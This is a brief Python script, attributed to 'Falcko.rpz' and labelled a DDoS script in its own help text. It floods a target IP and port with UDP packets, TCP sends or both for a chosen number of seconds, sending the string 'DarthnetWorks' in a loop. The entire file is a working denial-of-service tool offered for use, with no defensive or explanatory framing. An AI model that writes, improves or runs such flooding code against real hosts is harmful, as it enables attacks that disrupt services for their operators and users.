#Script By Falcko.rpz !

import socket
import math
import sys
import threading
import random
import re
import urllib
import  ssl
import multiprocessing
import time
import getopt

def help():
	print("Script DDOS by Falcko: Falcko.py <methode>")
	print("                                       udp <ip> <port> <temps>")
	print("                                       tcp <ip> <port> <temps>")

def finddos():
	global on
	on = False

if len(sys.argv) == 1:
	help()
elif len(sys.argv) == 5:
	methode = sys.argv[1]
	ip = sys.argv[2]
	port = int(sys.argv[3])
	time = int(sys.argv[4])
	if methode == "udp":
		print("UDP: " + str(ip) + ":" + str(port) + " " + str(time) + "sec")
		udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		on = True
		timer = threading.Timer(time, finddos)
		timer.start()
		while on:
			udp.sendto(b"DarthnetWorks",(ip, port))
	elif methode == "tcp":
		print("TCP: " + str(ip) + ":" + str(port) + " " + str(time) + "sec")
		tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		tcp.connect((ip, port))
		on = True
		timer = threading.Timer(time, finddos)
		timer.start()
		while on:
			tcp.send(b"DarthnetWorks")
		tcp.close()
	elif methode == "patator-ip":
		print("Patator-ip: " + str(ip) + ":" + str(port) + " " + str(time) + "sec")
		udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		tcp.connect((ip, port))
		on = True
		timer = threading.Timer(time, finddos)
		timer.start()
		while on:
			udp.sendto(b"DarthnetWorks",(ip, port))
			tcp.send(b"DarthnetWorks")
		tcp.close()
	else:
		help()
else:
	help()
print("Skype : Falcko.rpz")